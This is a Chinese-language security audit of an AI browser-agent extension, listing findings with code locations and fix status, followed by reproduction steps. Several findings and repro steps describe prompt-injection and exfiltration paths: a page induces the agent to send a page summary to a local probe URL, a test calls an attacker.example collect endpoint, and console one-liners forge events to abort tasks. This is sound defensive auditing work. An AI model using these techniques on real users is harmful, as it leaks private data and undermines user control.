20. **录制步骤和截图队列无上限，页面脚本可合成事件放大消耗**（`src/background/workflow-recorder.ts:140`、`:231-260`、`src/content/float-ball/hooks/useRecorder.ts:189-195`）。录制事件不检查 `isTrusted`，页面可循环派发 click/input；步骤数组和 `screenshotQueue` 无上限，`saveRecorderState` 全量写入且未捕获配额错误。建议过滤合成事件、限制步骤/队列上限并处理存储失败。**状态**：第 9 轮新发现，未修复。
21. **录制提交的起始/导航 URL 未脱敏即发送给 LLM**（`src/background/workflow-recorder.ts:110-116`、`:200`、`:302-317`；`workflow-recorder-prompt.ts:10-15`）。`redactRecordedStep` 只处理 `value`，`startUrl` 与 `navigate.url` 原样进入审计 prompt 和 session storage，可能泄露 token/OAuth code/邮箱等查询参数。建议提交前对 URL 的 userinfo、查询参数和片段做脱敏。**状态**：第 9 轮新发现，未修复。
22. **阶段交接把全部标签页 URL/标题注入 LLM**（`src/ai/phase-orchestrator.ts:34-53`、`:176-184`）。`getBrowserState` 用 `chrome.tabs.query({})` 取所有窗口的前 10 个标签页并原样返回 `url`/`title`；`buildHandoffPrompt` 在交接时把这些内容作为 user message 发送给模型。即使用户只让 AI 操作一个标签页，邮箱/网银/OAuth/内网 URL 及查询参数也会离开本机，且没有租约、来源过滤或脱敏。建议只纳入任务租约内的标签页（其余最多给数量/域名），并对 URL 的 userinfo/query/fragment 脱敏。**状态**：第 10 轮新发现，未修复。
23. **取消发生在工具组中途时残留没有 output 的 `function_call`**（`src/ai/tool-executor.ts:386-456`、`src/ai/core-loop.ts:756-757`、`src/background/session-manager.ts:688-706`）。串行组/并行确认中途 abort 后只返回已执行调用的结果，未执行调用的 `function_call` 没有对应 `function_call_output`；`core-loop` 在下一轮顶部返回，`runSessionTaskChat` 仍把残缺上下文写入 `session.context`，恢复会话时 Responses API 会因配对缺失拒绝请求。此外并行组在 abort 后仍会执行已收集的 `approvedCalls`。建议在 `finally` 中为所有未处理 `call_id` 补 `cancelled` output，执行前再次检查 `signal.aborted`，并在持久化前校验配对。**状态**：第 10 轮新发现，未修复。
24. **日志缓冲区并发读改写会丢失日志，写入失败被静默吞掉**（`src/lib/storage.ts:74-82`、`src/lib/console.ts:55-57`）。`addLog` 每次先读 `log_data`、内存 `shift/push`、再全量写回，多个并发日志会互相覆盖；达到 `MAX_LOG_NUM` 时还会多丢条目。`chrome.storage.local.set` 回调不检查 `chrome.runtime.lastError`，配额失败仍 resolve，调用方的 `.catch` 永不触发。建议串行化读改写、检查 lastError，并补并发/配额单测。**状态**：第 11 轮新发现；第 31 轮复核：`storage.save/clear/remove` 已检查 `chrome.runtime.lastError`，但 `addLog` 仍无并发串行化且忽略 lastError，维持部分修复。
25. **二进制传输缓存无全局数量/总字节上限，分片读取可无限续期**（`src/functions/fetch-url.ts:7-14`、`:54-65`、`:68-80`）。每个 `fetch_url(binary)` 最多 12MB 放入模块级 `transfers` Map，只有 60s TTL；`readBinaryTransferChunk` 每次成功读取都会重置过期时间，调用方可反复读一小段让大对象长期驻留。`fetch_url` 支持并行，短时间可累积多份 12MB 缓冲，触发 service worker 内存压力。建议增加全局/每任务数量与总字节上限、绝对过期时间或最大读取次数，并在任务结束时统一释放。**状态**：第 11 轮新发现，未修复。
26. **发布工作流跳过测试/类型检查，且持有写权限和可变 action 标签**（`.github/workflows/release.yml:3-35`、`:8-9`、`:15-24`、`:31-35`）。任何 `v*` 标签直接触发 `npm ci` + `npm run build`，不跑 test/typecheck/lint/audit/docs；workflow 持有 `contents: write`，checkout 默认保留凭据，action 按可变 tag 引用。未通过 CI 的提交或有漏洞的依赖构建可被直接发布；供应链攻破可利用写权限修改仓库/Release。建议 release `needs` 完整的 verify 流程、校验标签提交、收窄权限、`persist-credentials:false`，并把 action 固定到 commit SHA。**状态**：第 12 轮新发现，未修复。
27. **锁文件把所有依赖固定到第三方 npm 镜像**（`package-lock.json:38`、`:54`、`:65` 等，共 387 处 `registry.npmmirror.com`；`.npmrc:1`）。`npm ci` 按 `resolved` 访问该镜像，CI/发布/海外开发者都依赖其可用性；`.npmrc` 只设置 `legacy-peer-deps=true`，未声明 registry 策略。integrity 能阻止内容篡改，但镜像故障会阻断构建，`legacy-peer-deps` 还会掩盖 peer 冲突。建议用官方 registry 重新生成锁文件、在 CI 校验来源域名，并移除或说明 `legacy-peer-deps`。**状态**：第 12 轮新发现，未修复。
28. **manifest 未声明最低 Chrome 版本，却依赖 `sidePanel`/`offscreen`**（`public/manifest.json:1-30`；`src/background/channel-handlers.ts:210-220`；`src/App.tsx:91`）。manifest 无 `minimum_chrome_version`；Chrome 88–108 可安装 MV3，但 `offscreen` 需 109+、`side_panel` 需 114+。旧版可能因未知 `offscreen` 权限安装失败，或 `chrome.sidePanel` 为 undefined 时点击入口直接抛错。建议声明 `"minimum_chrome_version": "114"`，对所有 `sidePanel`/`offscreen` 调用做特性检测并给出升级提示。**状态**：第 12 轮新发现，未修复。
29. **`clipboard_ops` 的 `write` 无确认，提示注入可静默替换剪贴板内容**（`src/functions/clipboard-ops.ts:50-52`、`:68-95`）。`permissionLevel: 'interact'`，只有 `read` 覆盖为 `sensitive`；`write` 不弹审批，content script 直接 `navigator.clipboard.writeText` 覆盖用户剪贴板。页面可诱导模型写入攻击者地址/命令/URL，用户随后粘贴时中招；`read` 有确认而 `write` 没有，权限模型不一致。建议把 `write` 提升为 `sensitive` 并展示待写内容预览（或限制为用户显式请求），同时限制 `text` 长度。**状态**：第 13 轮新发现，未修复。
30. **`TimerStore` 的读改写没有串行化，并发 set/clear 会丢任务或复活已取消任务**（`src/lib/timer-store.ts:44-74`）。`save/update/remove` 都是先 `getAll()` 得到整数组、在内存修改、再用一次 `chrome.storage.local.set` 写回；两个会话/并行工具组/触发路径并发时，后写覆盖先写，任务会消失；`remove` 与 `save` 交叉还可能把已取消的任务写回，`currentCount` 丢失会让 `max_count` 失效。建议引入串行队列/互斥锁，或把每个定时器存为独立 key，并补 save/save、save/remove、update/trigger 并发单测。**状态**：第 14 轮新发现；第 32 轮已修复：`TimerStore.save/update/remove` 通过串行队列执行读改写，`save` 按 id 去重，`timer.test.mjs` 覆盖 8 路并发 save、重复 save 与并发 remove/save。
31. **`site_experience` 的 `save` 可跨域写入并整体覆盖本地经验，后续 `choose` 可被塑形到指定选择器**（`src/functions/site-experience-tool.ts:20-23`、`:38-44`；`src/functions/site-experience.ts:451-466`、`:539-550`、`:565-590`、`:777-790`）。`save` 为 `interact` 且不弹确认，`experience.domains` 接受任意 host；`copyMemory` 只做规范化，`saveSiteExperience` 直接覆盖整个本地层（不 merge）。页面可写入 `bank.example` 的高置信度 `#transfer` 点击统计，之后 `choose(goal:'click')` 返回该 selector，模型可能用于普通点击；也可传空 domains 清空用户全部经验。经验文本经过净化、不会执行脚本，故定为 P2。建议只允许当前域/显式确认的跨域写入、按域 merge、限制域数量并记录来源；补跨域拒绝与空 domains 不删除旧经验的测试。**状态**：第 15 轮新发现；第 32 轮已修复：`save` 提升为 `sensitive`，只允许写入当前标签页域，`saveSiteExperience` 改为按域合并而非整体覆盖，空提交/跨域提交不能清空其他站点；`site-experience.test.mjs` 新增合并用例。
32. **`withNewTabs` 在 `run()` 失败/任务取消时不回收新标签页，`closeOwnedTabs` 无法补偿**（`src/background/task-manager.ts:110-143`、关联 `:194-219`）。新标签页只有在 `run()` 正常返回后才 `attachNewTab`；`run()` 抛错或 `:130` 的 `assertNotCancelled` 抛错时只移除监听器，已创建的标签页既无 lease 也不在 `ownedTabIds`，`cancel()` 的 `closeOwnedTabs` 看不到它们；`:214` 又会把未成功关闭/未 attach 的 ID 从 `ownedTabIds` 丢弃，后续无法重试。影响是点击/提交打开的新标签页在失败或取消后残留（可能含登录态/敏感页面），且无人追踪。建议在 `finally` 关闭未 attach 的 `created` 标签页（仅限 opener/source 证明本次创建），或先 attach 再检查取消；`closeOwnedTabs` 只移除实际成功关闭的 ID。**状态**：第 20 轮新发现，未修复。
33. **5 秒空闲 detach 未考虑控制台/Fetch 监听，启动后约 5 秒静默失效**（`src/lib/cdp-session.ts:185-193`、`:267-280`、`:656-675`、`:730-789`）。`scheduleIdleDetach` 只豁免 `networkListening.active`；`startConsoleListening`/`startFetchInterception` 都没有 touch 或豁免，`attach` 后 5 秒无新 CDP 命令就 `detach`，随后 `cleanupTabState` 删除 `consoleListening`/`consoleEntries`/`exceptionEntries`/`fetchInterception`/`fetchPausedRequests`。因此“启动控制台捕获/请求拦截”后等待几秒再操作，捕获已停止，`get_logs` 返回空、Fetch 拦截失效；与网络监听的最大时长/显式 stop 设计不一致。建议在空闲 detach 中同时检查这两个 active 状态，并引入独立最大时长与显式 stop；补等待 >5 秒的回归测试。**状态**：第 21 轮新发现；第 32 轮已修复：`scheduleIdleDetach` 与定时器回调同时检查网络/控制台/Fetch 活跃状态，停止监听后重新排入空闲 detach；`cdp-session.test.mjs` 新增控制台与 Fetch 的 5 秒后仍保持 attach 用例。
34. **`elementHandleMap` 的 4000 上限没有同步约束 `elementHandleSnapshotMap`，快照元数据可持续增长**（`src/content/page-grounding.ts:327-340`、`:413-419`、`:111-113`）。`pruneDetachedHandles` 在超过 `MAX_TRACKED_HANDLES` 时只 `elementHandleMap.delete(id)`（`:338`），不删除对应的 `elementHandleSnapshotMap`；只有元素脱离文档时才一起删除（`:330-331`）。大 DOM/长会话中反复快照且元素保持 connected（虚拟列表、旧节点不回收、持续新增）时，句柄表被限制在 4000，元数据表却按历史元素数量增长且无上限，内容脚本内存持续上升。旧 ref 因句柄已删除而无法解析，不构成越权；建议在删除句柄时同步删除元数据，或给元数据表单独设上限并按 `snapshotId` 代际清理。**状态**：第 22 轮新发现；第 32 轮已修复：`pruneDetachedHandles` 在因上限删除句柄时同步删除 `elementHandleSnapshotMap`，元数据随句柄表一起受 4000 上限约束。
35. **`session.eventLog` 在内存中无上限，持久化截断只作用于快照副本**（`src/background/session-manager.ts:556-559`、`:512-514`；`src/background/session-persistence.ts:47-51`；`src/background/session-types.ts:217`）。`createSessionPushEvent` 对每个 AI 流事件直接 `session.eventLog.push(...)`，没有长度判断；`snapshotSessionForRuntime` 仅在写入存储时复制并 `slice(-MAX_RUNTIME_EVENT_LOG)`（500），原数组继续保留全部事件。长会话/大量工具调用会让 service worker 持有持续增长的数组和大字符串；每个 `turn_completed` 还会对完整 `eventLog` 做 `some` 去重扫描，随事件数变慢。建议在 push 后按轮次边界裁剪到内存上限，或使用环形缓冲/固定容量队列，并补 >500 条事件的单测。**状态**：第 23 轮新发现；第 32 轮已修复：`session.eventLog.push` 后按 `MAX_RUNTIME_EVENT_LOG` 裁剪内存数组，长会话不再无限增长。
36. **`screenshot(url)` 只在导航前校验初始 URL，公网重定向到内网仍会被截图**（`src/functions/screenshot.ts:54`、`:180-194`、`:207-312`）。`screenshot` 为 `read` 不弹审批；`url` 路径只对初始地址调用 `isSafeNavigableUrl`/`isBlockedFetchUrl`，随后 `chrome.tabs.create` 跟随 302 到 `http://127.0.0.1/...` 或内网地址，`waitUntilTabReady` 后直接 `captureVisibleTab`/`Page.captureScreenshot`，没有复检 `chrome.tabs.get(targetTabId).url`。影响是把本机管理页/内网页面的可视内容带出到模型和 artifact；与第 7 条的 `fetch_url` 重定向、第 3 条的跨标签页租约是不同路径。建议截图前校验最终 URL，命中私有/非 http(s) 时关闭标签页、释放租约并失败；补重定向 mock 测试，并在真实 Chrome 验证。**状态**：第 29 轮新发现，工作区随后已修复（`screenshot.ts:207-214` 增加最终 URL 复检，`screenshot.test.mjs:64-82` 覆盖 loopback 重定向；5 pass），保留真实 Chrome 回归项。

37. **阶段交接已共享墙钟与工具预算（已修复）**（`src/ai/phase-orchestrator.ts:246-284`；`src/ai/core-loop.ts:426-437`；`src/ai/loop-config.ts:125-126`、`:217`、`:226`）。第 31 轮修复在 `phaseOrchestrator` 创建一次 `taskDeadline` 并传给每次 `agenticLoop(...)`，墙钟预算不再按阶段续期；本轮新增 `LoopBudget.sharedUsage`，`round`/`totalToolCalls`/`emptyRetries`/同签名计数跨阶段累计，达到 `MAX_PHASES` 时发出 `E_PHASE_LIMIT` 显式失败。子代理改用独立计数，避免与父循环共享可变计数器导致轮次回退。**状态**：第 30 轮新发现，第 31 轮部分修复，第 32 轮已补齐（当前工作区已含 `LoopBudget.sharedUsage` 与 `E_PHASE_LIMIT`，按最新代码视为已修复）。
38. **无身份 `handleChat` 已不再清空所有会话的敏感信任（已修复）**（`src/ai/orchestrator.ts:51-53`；`src/ai/tool-executor.ts:146-150`；`src/background/resident-ai.ts:50-54`）。修复后 `handleChat` 先取 `sessionId || taskId`，只有作用域非空才调用 `resetSensitiveAccessTrust`；常驻 AI 仅传 `{ owner: 'extension-agent' }` 时不会触发全清，并发会话的“本次不再询问”不再被误伤。`resetSensitiveAccessTrust()` 的无参全清仍保留给测试/登出，调用方需继续避免无参调用。**状态**：第 30 轮新发现，第 31 轮已修复。
39. **`data_pipeline` 的 `export` 以 `read` 静默写文件，`filename` 未清洗且不限扩展名**（`src/functions/data-pipeline.ts:184-189`、`:247-250`、`:483-518`）。`permissionLevel: 'read'`，没有 `actionPermissions`；`export` 把 `params.filename` 原样传给 `chrome.downloads.download({ url: data:..., filename })`，默认名只清洗 `buffer.name`，用户/模型提供的 `filename` 不经过 basename、控制字符、Windows 保留名或扩展名白名单。模型可先 `append` 任意内容（同为 `read`），再 `export` 为 `.html`/`.svg`/`.command` 等，下载过程无确认；Chrome 会拒绝绝对路径和 `..` 组件，因此主要是任意扩展名/任意 Downloads 文件名与社会工程风险。建议把 `export` 提升为 `sensitive`，复用 `download-file.ts` 的文件名清洗与可执行后缀拒绝，只允许 `json/csv/md/tsv` 扩展并固定 MIME；补 `../../x`、`CON.txt`、`.command` 用例。**状态**：第 31 轮新发现；第 34 轮结束观测已修复：`data_pipeline` 的 `export` 提升为 `sensitive` 并补审批文案，`filename` 复用 `download-file.ts` 的 `sanitizeFilename`，仅允许 `json/csv/md/markdown/tsv/txt`，拒绝路径穿越、Windows 保留名和可执行后缀。

40. **网络监听的 30 分钟最大时长只在网络事件到达时检查，空闲监听永不自动停止**（`src/lib/cdp-session.ts:447-460`、`:491-530`、`:568-578`）。`startNetworkListening`/`ensureNetworkListening` 只把 `maxDurationMs` 写入状态，没有注册到期定时器；`pushNetworkEvent` 里的 `now - startedAt > maxDurationMs` 只有在新网络事件到来时才执行，而 `scheduleIdleDetach` 在 `hasActiveListeners` 为 true 时直接返回。因此客户端 `start` 后页面没有网络活动、也没有显式 `stop` 时，`chrome.debugger` 会一直附着，`networkEvents`/`pending` 状态保留，DevTools 无法正常打开；30 分钟上限对“空闲监听”不生效。建议在 start/ensure 时用 `setTimeout` 注册剩余时长（显式 stop 时 clear），并在 `getNetworkEvents`/空闲回调再兜底检查；补“启动后无事件等待超过上限”的 mock 测试。**确认**：静态路径已证实；需真实 Chrome 观察 debugger 附着与自动停止。**状态**：第 32 轮新发现；第 34 轮结束观测已修复：`startNetworkListening`/`ensureNetworkListening` 注册 `scheduleNetworkExpiry` 到期定时器，`stopNetworkListening` 清理定时器，空闲监听也会在 `maxDurationMs` 后自动停止。

41. **`saveSiteExperience` 的按域合并没有串行化，并发保存会互相覆盖**（`src/functions/site-experience.ts:783-795`；`src/functions/site-experience-tool.ts:49-59`）。`saveSiteExperience` 先 `readMigratedStorage` 读当前层，再把 incoming domains 合并后整体 `set`；没有锁/队列。两个会话/标签页同时对不同域调用 `site_experience(save)` 时，双方读到同一旧快照，后写者会把先写者的域覆盖掉（本次修复只保证空提交/跨域提交不主动清空，未解决读改写竞态）。建议复用 `TimerStore` 的串行 mutation 队列或按域名独立 key/原子更新；补两个域并发 save 的测试。**确认**：静态路径已证实；需多会话并发验证。**状态**：第 32 轮新发现；第 34 轮结束观测已修复：`saveSiteExperience` 与 `addSiteExperienceDraft` 共用 `serializeSiteExperienceMutation` 串行队列，草稿的读改写也在同一队列内执行。

42. **`createSession` 在全部现有会话都在运行时不再执行 `MAX_SESSIONS` 淘汰，容量上限可被持续突破**（`src/background/session-manager.ts:1153-1170`）。修复“不得中止运行中任务”后，候选过滤排除了所有 `status === 'running'`/有 controller/有运行任务的会话；当 10 个会话都在运行时，`victim` 为 `undefined`，代码只 `console.warn`，新会话仍已 `sessions.set`，每次创建都会使 `sessions.size` 继续增长；`timer-dispatch` 每次触发都创建新会话，长任务/频繁定时器可放大。建议在没有可淘汰项时拒绝/排队新会话，或设置硬上限并优先复用已结束/专用会话；补“全部运行中仍创建第 11 个”单测。**确认**：静态路径已证实；需真实运行时观察会话表/持久化增长。**状态**：第 32 轮新发现；第 34 轮结束观测已修复：没有可淘汰项时 `sessions.delete(id)` 并抛出“会话数已达到上限”，不再继续增长；候选只选择已结束且无 controller/运行任务的会话。

43. **页面脚本可派发全局 `actspan-escape` 触发 `__session_clear`，中止当前任务**（`src/content/float-ball/hooks/useGlobalEvents.ts:37-41`、`:62-63`；桥接 `src/content/float-ball-react.tsx:117-122`；清空路径 `src/background/session-channel-handlers.ts:686-696`、`:373-383`）。`useGlobalEvents` 直接监听 window 上的自定义事件，没有来源/`isTrusted` 校验；页面可 `window.dispatchEvent(new CustomEvent('actspan-escape'))` 或向 document 合成 `keydown Escape`（`float-ball-react.tsx:118-122` 同样不校验 `isTrusted`），内容脚本随即发送 `__session_clear`。该 handler 会对运行中的会话调用 `abortSessionTask(..., '会话已清除')`，并在所有标签页广播清空。影响：任意页面可反复中止用户任务/关闭面板，打断审批或长任务；不直接读取数据。建议只接受可信键盘事件（`event.isTrusted`）或改为 closed shadow 内部事件，并在 background 校验请求来源与用户手势；补页面合成事件用例。**确认**：静态路径已证实；跨隔离世界的事件可达性需真实 Chrome 验证。**状态**：第 33 轮新发现；第 34 轮已修复（可信事件/closed shadow 与 `isTrusted` 校验），并已复核 74 项内容脚本测试。以下保留原始分析。

44. **录制遮罩的完成/取消按钮在页面 DOM 中且未校验 `isTrusted`，页面可合成点击停止/丢弃录制**（`src/content/recorder-overlay.ts:219-233`、`:241`）。`showRecorderOverlay` 把按钮直接 `document.body.appendChild`（不在 closed shadow），页面脚本可 `document.querySelector('#actspan-recorder-overlay .complete').click()`；click handler 只 `preventDefault/stopPropagation` 后调用 `onCompleteCallback`/`onCancelCallback`。complete 会停止捕获并提交录制审计，cancel 会丢弃步骤；页面可在用户不知情时结束录制或让敏感操作不被记录。建议在 handler 检查 `event.isTrusted`，或将遮罩放入 closed shadow/使用扩展页面承载；补合成点击用例。**确认**：静态路径已证实；需真实 Chrome 验证。**状态**：第 33 轮新发现；第 34 轮已修复（可信事件/closed shadow 与 `isTrusted` 校验），并已复核 74 项内容脚本测试。以下保留原始分析。

45. **Service Worker 启动恢复会清空恢复期间新建的会话/任务/租约**（`src/background.ts:39`、`:79-95`；`src/background/session-persistence.ts:101-111`；`src/background/task-manager.ts:279-305`）。`Channel.listen()` 在模块顶层立即开始处理消息，而会话/任务恢复是随后启动的异步 IIFE：`restoreRuntimeSessions` 先 `await readMigratedStorage(...)`，再 `sessions.clear()`/`sessionTaskKinds.clear()`；`taskManager.restore` 先 `await chrome.storage.local.get(...)`，再 `this.tasks.clear()` 并 `leases.restore(...)`。若 content/MCP 消息在 await 期间到达（例如 `__session_create`、`task.submit`、`tab.open`），新会话/任务/租约已经写入内存，恢复继续执行时会把它们整体清掉；`task.submit` 的 runner 仍持有已脱离 Map 的对象继续运行，`task.status`/`task.result` 随后找不到任务，持久化也可能用旧快照覆盖新状态。建议在 `Channel.listen()` 前等待恢复完成，或用 `restoreReady` Promise 门控消息处理；恢复时不要无条件 `clear()`，应合并或只替换恢复开始前已存在的条目；补“恢复 await 期间注入消息”的并发单测。**状态**：第 34 轮新发现，未修复。

46. **`ArtifactStore.getScreenshot` 命中内存缓存后不再检查 24 小时过期，已过期截图仍可读取/下载**（`src/lib/artifact-store.ts:26`、`:40-47`、`:77-84`；调用方 `src/functions/download-file.ts:125`、`src/ai/core-loop.ts:158`）。`compactArtifacts` 只在 `runWrite` 和缓存未命中的 `getScreenshot` 路径执行；`getScreenshot` 一旦命中 `memoryCache` 就直接返回记录，不再比较 `createdAt` 与 `EXPIRE_MS`。`saveScreenshot` 会把当前记录放进缓存，因此长驻 Service Worker 在 24 小时内没有新的 artifact 写入时，过期截图仍会从内存返回；`download_file({ artifact_id })` 也只校验 data URL 格式/大小，不校验年龄。影响：包含登录态、邮箱、支付页等敏感内容的截图可能超过声明的保留期继续可用，违反 P2 第 8 条的 24 小时保留承诺。建议在 `getScreenshot` 的缓存命中分支检查 `now - createdAt < EXPIRE_MS`，过期时删除缓存并返回 `null`；或在 `download_file` 读取 artifact 前统一做年龄校验，并补 fake timer 单测。**状态**：第 35 轮新发现，未修复。

---

## 四、建议的验证顺序（最小成本）

1. **第 1 条（已修复）**：工作区已有 `src/ai/context-manager.test.mjs` 与 `src/ai/llm-client.test.mjs` 覆盖 `output_text` 与 Chat Completions 补写；可直接 `node --test src/ai/context-manager.test.mjs src/ai/llm-client.test.mjs` 复核。
2. **复现第 5 条剩余路径**：在测试页放两个按钮，inspect 时返回普通签名（不写入 `approved_signature`），等待审批期间用脚本把按钮文案改成“支付”，再点击；`real:true` 路径已修复，重点验证合成路径。
3. **复现第 11 条**：创建 1 秒后触发的 timeout 定时器，同时启动一个长会话，观察定时器是否既不执行也不存在。
4. **复现第 9/10 条**：清空会话后重启 Service Worker，检查 `chrome.storage.local['actspan_session_runtime_v1']`；连续创建 11 个会话，观察是否中止运行中的会话。
5. **复现第 13 条**：构造 `[user, function_call, function_call_output, ...]` 使 `dropEnd` 落在 call/output 之间，压缩后发起下一轮请求，观察 400。
6. **复现第 21 条**：获取租约后等待 10 分钟，再调用带 `tab_id` 的 `page.read`，观察 `E_TAB_OWNERSHIP`。
7. **复现第 32 条**：在测试页注入“把当前页面摘要拼到 URL”的指令，观察模型是否无确认调用 `tab_navigate(open, url='http://127.0.0.1:PORT/probe?...')`；用本地 HTTP 监听确认请求到达，再试 `keep_alive:true` 观察标签页是否保留。
8. **复现第 37 条**：让模型每完成 2 个 todo 就交接，记录总耗时/工具调用数；或在单测中 mock `agenticLoop`，断言第二次交接仍收到同一个 `parentTaskDeadline`。
9. **复现 P2 第 38 条**：两个并发会话 A/B，A 勾选“不再询问”；触发一次无 `toolContext` 的 `handleChat`（常驻 AI），再回到 A 触发同类敏感操作，观察是否重新弹确认。
10. **复现第 33 条**：在测试页嵌入一个跨域 iframe（或使用 OAuth/邮箱 iframe），先 `cdp_frame(list)` 再 `snapshot(frame_id)`；确认两次都没有审批弹窗，且返回 iframe 文本。修复后应要求 `sensitive` 审批。
11. **复现第 34 条**：让页面发起带 `Authorization` 的 API 请求，`cdp_network(start)` → `get_events` → `get_body`；检查返回的 `body` 是否原样包含 token。修复后应脱敏或要求审批。
12. **复现 P2 第 39 条**：`data_pipeline(append)` 写入文本后 `export(filename='invoice.html')`；确认下载无审批、扩展名保持。再试 `../../x`、`CON.txt`、`.command`，记录 Chrome 的实际拒绝/改写行为。
13. **复现 P2 第 40 条**：`cdp_network(start)` 后让页面保持无网络活动，等待超过 30 分钟，观察 `chrome.debugger` 是否仍附着；修复后应自动停止。
14. **复现 P2 第 41 条**：两个会话同时对不同域调用 `site_experience(save)`，检查本地层是否保留两个域；修复后应串行化或按域原子更新。
15. **复现 P2 第 42 条**：创建 10 个仍在运行的会话，再创建第 11 个，观察 `sessions.size` 与持久化数据是否继续增长；修复后应拒绝/排队或复用会话。
16. **复现第 35 条**：在登录/支付页填入密码、`autocomplete=one-time-code`、`cc-number`，调用 `page(action="skeleton")` 与 `page(action="snapshot")`；检查返回的 `attrs.value`/`value` 是否出现原值。再打开 `include_hidden` 试 hidden CSRF 字段；修复后敏感字段应只返回已填写/已隐藏标记。
17. **复现 P2 第 43 条**：在页面控制台执行 `window.dispatchEvent(new CustomEvent('actspan-escape'))`（或合成 Escape keydown），观察当前任务是否被 `__session_clear` 中止；修复后合成事件应被忽略。
18. **复现 P2 第 44 条**：录制中执行 `document.querySelector('#actspan-recorder-overlay .complete').click()` / `.cancel.click()`，观察录制是否被停止/丢弃；修复后合成点击应被忽略。
19. **复现第 36 条**：让 MCP 客户端调用 `tab.open({url:'http://127.0.0.1:PORT/admin'})`，观察审批文案是否显示 URL、标签页是否创建成功，随后 `page.read` 是否无审批返回内网正文；再用公网 302 到 loopback 的地址测试最终 URL 复检。
20. **复现第 37 条**：在测试页嵌入跨源 iframe，调用 `page.snapshot({include_non_interactive:true})`，确认返回的 `elements[].text` 是否包含 iframe 文本且无审批；修复后跨源 frame 应提升为 `sensitive`。
21. **复现 P2 第 45 条**：在 Service Worker 冷启动时注入一条 `task.submit`/`session_create` 消息（可在 `chrome.storage.local.get` 前打桩延迟），检查恢复完成后任务是否从 `task.status`/`sessions` 中消失。
22. **复现第 38 条**：用 MCP 客户端分别调用 `data.fetch({url:'https://attacker.example/collect', sections:['content']})`、`data.paginate({url:'https://example.test/api', param:'page'})`、`data.download({content:'x', filename:'probe.html'})`；观察是否有审批弹窗。修复后三者都必须命中审批，`data.fetch`/`data.paginate` 未批准不得发出请求。
23. **复现第 39 条**：在本机起一个 HTTP 监听，调用 `data.paginate({url:'http://127.0.0.1:PORT/admin', param:'page'})`，确认监听收到请求且返回内容为空/被拒；再用公网 URL 302 到 loopback，确认请求是否在最终地址复检前到达。修复后请求前应直接拒绝，监听不应收到连接。
24. **复现 P2 第 46 条**：保存一张截图后把系统时间推进 24 小时（或在单测中 mock `Date.now`/`createdAt`），在 Service Worker 不重启且没有新截图写入的情况下再次 `download_file({artifact_id})`/`getScreenshot`；修复后应返回“截图不存在或已过期”。

---

### 附：本次审计中确认相对稳健的部分（避免误伤）

- MCP 请求/响应通过 `clientId + requestId + taskId + sessionId + tabId` 五元组匹配（`mcp-server/bridge.js:328-332`），伪造响应需要同时知道这些值。
- `appendAudit` 对参数做白名单与主机哈希，审计文件权限为 0600（`mcp-server/bridge.js:465-497`）。
- `policy-executor` 对“省略 tabId 以跳过确认”的路径做了 `tabScoped` 兜底（`src/background/policy-executor.ts:40-42`），比单纯依赖 `context.tabId` 更稳。
- `page-grounding` 的 ref 动作要求同一 `snapshot_id`，并在存在 `approved_signature` 时于点击/提交前重算签名；但缺少签名时会 fail-open（第 5 条）。
- `redactSensitive` 对 `expression`/`eval` 做截断、对循环引用做标记，基础防护到位。

（以上均为静态审计结论；涉及浏览器/存储配额、SSE 兼容性等条目建议在真实 Chrome + 目标服务上再做一次端到端验证。）
